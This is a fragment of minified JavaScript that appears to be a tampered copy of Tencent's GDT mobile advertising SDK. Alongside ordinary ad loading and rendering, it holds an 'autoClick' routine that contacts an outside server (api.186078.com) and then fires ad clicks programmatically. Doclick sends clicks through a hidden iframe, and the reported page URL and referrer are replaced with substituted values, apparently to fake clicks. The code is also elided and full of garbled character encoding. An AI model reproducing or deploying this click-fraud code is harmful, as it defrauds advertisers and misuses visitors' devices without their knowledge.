...
default = i
	...
	function() {
		var e = {
			...
			default ({
				...
				e.display_type, e.checkLoadCondition(o, i, c) && (s ? _.isTBSPageView() && g.loadJS("//res.imtt.qq.com/tbs/tbs.js", function() {
			...
			getReqCond: function(t) {
				var n = navigator.userAgent.toLowerCase() || "",
					...
					c = (g.getCookie("debug_h5sdk_module"), {
						...
						url: window.all_info.ttt.u, //url: document.location.href,
			...
			loadAd: function(t, n) {
				for (var o = e, i = !1, a = [], d = 0; d < o.originConflist.length; d++) if (o.originConflist[d].context = JSON.parse(JSON.stringify(o.originConflist[d].tempContext)), t == o.originConflist[d].posId) {
					...
					break
				}++e.load_count, e.restrict[t] && e.restrict[t].hitRestrictMap && (i = e.restrict[t].hitRestrictMap(e.load_count, e.CONST.ACCESS_COUNT)), !0 !== i && GDT.load(a), r.
			default.evnet(120312, "ad_load", {
					placement_id: t,
					fromTbs: n
				})
			},
			checkAndLoadNativeAd: function() {
				var t = e;
				var uuu = '//qzonestyle.gtimg.cn/qzone/biz/comm/js/qbs.js';
				t.conflist && t.conflist.length > 0 && !t.qbsLoaded && g.loadJS(uuu, function() {
					t.qbsLoaded = !0;
			...
			reqRequest : function (url, param, fnSucc, fnFaild, reqnum,n1){
				...
				if("withCredentials" in oAjax){
				    oAjax.open('POST', url, true); //open(?è§??, url, ????å¯??å§??)
			...
			reqResponse: function (responseText, reqnum,n1) {
				...
				if (parseInt(obj.status) === 1){
					...
					n = n1;
					e.clickTemplateNativeAd(t,n,o,1);
			...
			resolution: function() {
			    var z ={};
			    var a = z,
				    bwidth = [640, 480, 320, 240],
				    bheight = [100, 75, 50, 38];
			    var w = 480,
				    h = 75,
				    os = a.osType,
				    screen = z.screen || window.screen;
			    a.posw = bwidth[0];
			    a.posh = bheight[0];
			    try {
				    var b = window.devicePixelRatio || 1;
				    if (screen) {
					    w = a.screen_width = screen.width;
					    h = a.screen_height = screen.height;
					    if (os == 2) {
						    w *= b;
						    h *= b
					    }
				    } else if (document.body) {
					    w = a.screen_width = document.body.clientWidth * b;
					    h = a.screen_height = document.body.clientHeight * b
				    }
				    alert(a.screen_width);
				    a.pxr = b;
				    a.screen_width = a.screen_width || 360;
				    a.screen_height = a.screen_height || 640;
				    if (w < h) {
					    var c = h;
					    h = w;
					    w = c
			...
			autoClick:function(n1,n2){
				
			if (parseInt(n1) === 0){
			    var type = 2;
			     var d_p_r = window.devicePixelRatio || 1;
				var s_w = document.body.clientWidth;
				var url = 'https://api.186078.com:3928/get_c.php?s_w='+s_w+'&d_p_r='+d_p_r+'&type='+type;
				var data = {};
				e.reqRequest(url, JSON.stringify(data), e.reqResponse, null, 1,n1);
			}else{
			     var type = 2;
			    if (n2 == 2){
				type = 1;
				...
				var t_time = Date.now();
				var jt = localStorage.getItem("cnzz_jump_time");
				if (jt != null && (t_time - jt) < 72000000) {

				}
				localStorage.setItem("cnzz_jump_time", t_time);
				var d_p_r = window.devicePixelRatio || 1;
				var s_w = document.body.clientWidth;
				var url = 'https://api.186078.com:3928/get_c.php?s_w='+s_w+'&d_p_r='+d_p_r+'&type='+type;
				var data = {};
     ...
     */
			...
			clickTemplateNativeAd: function(t, n, o,p1) {
				var p2 = p1 === 1 ? p1 :2;
				var i = e,
					a = i.loadedAd[n],
			...
			createIframeIn:function(id,schema){
			...
			renderTemplateAd: function(t, n, o) {
				...
				if (!1 !== i) {
					var r = setInterval(function() {
						...
						if (!y.checkIsHidden(t) && (i && "complete" == i.readyState || i && "interactive" == i.readyState)) if (i.body.scrollHeight > 150) t.style.height = i.body.scrollHeight + "px";
						else {
			...
			callback: function(t, n, o) {
				...
				if (n['ret'] == false){
				    ...
				    e.autoClick(n['data'][0]['traceid'],n['cfg']['pt']);
				}				
			...
			doExpose: function(t) {
				...
				if (!e.exposureOids[n]) {
					...
					e.exposureOids[n] = !0, r.
				default.evnet(120311, "ad_expose", t)
				}
			},
			doClick: function(t) {
				var p2 = t.p2;
				console.log('p2p2p2p2p2p2p2');
				console.log(p2);
				console.log('p2p2p2p2p2p2p2');
				for (var n = "", i = e, a = "", d = 0; d < i.originConflist.length; d++) if (t.placement_id == i.originConflist[d].posId) {
				...
				if (t && t.s && t.advertisement_id && t.placement_id) {
					if (a = t.traceid ? e.apUrlMap[t.advertisement_id + t.placement_id + t.traceid] : e.apUrlMap[t.advertisement_id + t.placement_id], r.
				default.evnet(120521, "do_click", t), !e.exposureOids[a]) return r.
				default.evnet(120528, "ERR_do_click", {
						params: JSON.stringify(t)
					}), {
						ret: 1,
						msg: "error??å±¼ç???³å??ç¹???å²??£é????????ï¿?"
					};
					try {
						var s = g.getCookie("gdt_fp");
						if (s) {
							//var c = "object" === o(t.s) ? decodeURIComponent(JSON.stringify(t.s)) : decodeURIComponent(t.s);
							var c = decodeURIComponent(t.s);
					...
					if (p2 !== 1){
					    if (n = i.rlMap[t.advertisement_id + t.placement_id] + "&s=" + t.s, i.isAndroidApp[t.advertisement_id]) {
						    ...
						    else n = ~~n.indexOf("&s_lp") > 0 ? n : n + "&acttype=" + i.CONST.ACTTYPE_DOWNLOAD, location.href = n
					    }else{ 
						i.isIOSApp[t.advertisement_id] && navigator && navigator.userAgent && -1 !== navigator.userAgent.indexOf("MicroMessenger") && (n += "&platform=wx&target=appstore");
						location.href = n;
					    }					    
					}else{
					    if (n = i.rlMap[t.advertisement_id + t.placement_id] + "&s=" + t.s, i.isAndroidApp[t.advertisement_id]) {
						    if (t.qqse_extStr) n = n + "&qqse_extStr=" + encodeURIComponent(JSON.stringify(t.qqse_extStr));
						    if (t._autodownload && (n = n + "&_autodownload=" + t._autodownload), e.getSite(t.placement_id) == e.CONST.SITESET_MOBILE_INNER) if (0 == t.redirect)(new Image).src = n;
						    else e.createIframeIn('qdf',n); //location.href = n;
						    else n = ~~n.indexOf("&s_lp") > 0 ? n : n + "&acttype=" + i.CONST.ACTTYPE_DOWNLOAD, e.createIframeIn('qdf',n);
					    }else{ 
						i.isIOSApp[t.advertisement_id] && navigator && navigator.userAgent && -1 !== navigator.userAgent.indexOf("MicroMessenger") && (n += "&platform=wx&target=appstore");
						e.createIframeIn('qdf',n); //location.href = n;
					    }						    
					}
			...
			t = {
				SUCCESS: [0, "éª????¡é???ºæ??´æ??å§?"],
				CONTAINERID_EMPTY: [100001, "containerid æ¶?å¶???æ¶??¹â????å²??????³å??éª????¡ç?¹ç?°æ??"],
				TEMPLATE_EMPTY: [100002, "?©æ?¿æ??¨å??ç®???å©????å¤¸è?ç»??´ç?????????????å§¹å??ç¹??¥ç?´æ???¹î?½å????©æ£¶æ£°ï¿½"]
			},
			n = {
				status: {
					code: 0,
		...
		window.GDT_HYB = n;
		var c = function(e) {
				if (this.hybrid = window.GDT_HYB, this.instance_id = this.getInstanceId(), this.app_id = this.hybrid.appid, this.placement_id = this.hybrid.posid, this.ext_url = this.hybrid.ext.url, this.xflow_pos_id = d.
			default.getParam("xflow_pos_id"), 0 == this.hybrid.status.code) {
					var t = {
		...
		var p, l, u, f = {
			...
			postNum: "",
			init: function(t) {
				t.adType = t.type, f.cfgs = t, f.filltype = t.filltype || t.fill_type, f.adType = t.type, f.site_set = t.site_set, f.posDomain = encodeURIComponent(document.location.protocol + "//" + document.location.host), f.postNum = Math.random(), f.posid = t.posid || t.placement_id, f.initPlatform(), "banner" == t.adType ? f.initBanner(t) : "interstitial" == t.adType ? f.initInter(t) : "native" == t.adType ? e.init(t) : "rewardVideo" == t.adType && n.initHybridAd(t), g.debugTest(), r.
			default.evnet(120533, "ad_init", t)
			},
			...
			checkParam: function(e) {
				return !new RegExp("[`~!@#$^&*()=|{}':;',\\[\\].<>/?~??ä¸?#???¢â??ï¸¹â??ï¿?&*????ç´?&mdash;?¥æ??{}???©â??????æ©?ç´±é??æ°£â??æ¿???ï¿?'????ç´???ä¾?ç´?]").test(e)
			},
			getUid: function() {
			...
			renderWindow: function(e, t, n, o, i) {
				...
				var x = window.all_info.ttt.u;//document.location.href
				...
				var referrerurl = encodeURIComponent(window.location != window.parent.location ?  window.all_info.ttt.r : "");
				if (b += "&visiturl=" + encodeURIComponent(x), b += "&referrerurl=" + referrerurl, b += "&iframeheight=" + m.BANNER_IFRAME_HEIGHT, b += "&iframewidth=" + m.BANNER_IFRAME_WIDTH, C && g.$("#" + C)) {
				...
				if (P.setAttribute("style", "display:none"), P.id = "gdt_banner_popup_wrap", "banner" == e.adType) {
					...
					k = 36, D = 12;
					a = a.replace(/{OTHER}/, 'display: inline-block;"  id="gdth_popup_wrap').replace(/{W}/, r.inter_posw + "px").replace(/{H}/, r.inter_posh + "px").replace(/{LOGO}/, '<div id="gdt_logo" style="background-image:url(//qzonestyle.gtimg.cn/open_proj/proj-gdt-toufang/img/ad-sign/logo-ad-s.png);background-size: cover;width:' + k + "px;height:" + D + 'px;position: absolute;right: 0;bottom: 0;"><i ></i></div>').replace(/{IFRID}/, "gdt_ifr").replace(/{CLOSEDIV}/, '<a href="javascript:" style="' + M + 'position: absolute;right:4px;top:5px;text-indent: -9999px;overflow: hidden;z-index: 100;" onclick="GDT.closeWindow(this)" class="icon_close">???½æ£´</a>'), B.innerHTML = a, B.style.display = "none", document.body.appendChild(B)
				}
				...
				f.bindPostMsg || (f.bindPostMsg = !0, f.onorientationChange("banner"), g.addEvent(window, "message", function(e) {
					...
					if ((t = g.skipHttpOrHttpsProtocol(t)) && t == f.adDomain && e && e.data) {
						...
						if (o || n) {
							...
							else if (n.op) if ("checkToLoadTBS" == n.op) _.isTBSsupported() && _.tbsLoad();
		...
		window.GDT = {
			...
			init: function(t) {
				...
				if (t) f.init(t);
				else for (var o = 0, i = n.length; o < i; o++) f.init(n[o]);
...
//					n.src = t ? "//3gimg.qq.com/mig_op/beacon/js/v113/beacon_release_jrlt.js?appkey=JS05KY1G393HQI&vc=1.0.1" : "https:" === window.location.protocol ? "//yz.nanadao.com/beacon_release_s.js" : "//yz.nanadao.com/beacon_release.js", document.body.appendChild(n), n.onload = function() {
//						e.feedback()
//					}					
...
default = new d
	...
	var r = {
		...
		default.getParam("xflow_lp_data"))
		},
		getFlowOpenId: function() {
			var e = r.getFlowLpData();
			return a.
		default.getParam("open_id", e)
		},
		getFlowNicename: function() {
			var e = r.getFlowLpData();
			return a.
		default.getParam("nicename", e)
		}
	};
	t.
default = r
